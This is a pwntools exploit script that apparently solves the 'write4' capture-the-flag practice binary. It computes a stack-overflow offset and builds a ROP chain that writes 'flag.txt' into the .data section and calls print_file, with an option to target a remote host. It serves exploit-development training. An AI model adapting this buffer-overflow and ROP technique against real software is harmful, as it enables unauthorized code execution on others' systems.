#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.read(proc.corefile.sp, 4))
    return ip_offset

exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'debug'

# crafting the payload
offset = find_offset(cyclic(100))
info(f"Offset: {offset:x}")

pop_data = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
info(f"Pop Data Gadget: {pop_data}")

mov_data = elf.symbols.usefulGadgets
info(f"Move Data Gadget: {mov_data}")

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
info(f"Pop RDI: {pop_rdi}")

data_section = elf.get_section_by_name('.data').header.sh_addr
info(f'Data Section Address: {data_section:x}')

payload = flat({ offset: [
        pop_data,
        data_section,
        b"flag.txt",
        mov_data,
        pop_rdi,
        data_section,
        elf.symbols.print_file
    ] })
write('payload', payload)
info(f"Payload: {payload}")

#executing the exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()

